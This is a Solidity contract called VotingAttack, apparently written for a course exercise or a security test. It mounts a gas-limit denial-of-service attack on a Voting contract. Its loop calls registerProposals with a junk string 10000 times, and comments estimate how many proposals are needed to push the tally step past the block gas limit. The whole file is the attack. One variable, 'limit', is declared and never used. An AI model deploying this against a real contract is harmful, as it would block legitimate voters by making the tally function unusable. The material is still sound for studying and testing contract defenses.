pragma solidity 0.8.9;

contract VotingAttack {
    Voting public votingContract;

    constructor(address _contractAddress) {
        votingContract = Voting(_contractAddress);
    }

    // aoccrding to calculation we need arround 5500 proposals to reach gas limit of 15 million in votesTallied
    function attackRegisterProposals() external {
        uint256 limit = 200;        // 200 iterations = 5 680 833 gas
        for (uint256 i; i < 10000; i++) {
            votingContract.registerProposals("Do some shit !");
        }
    }
}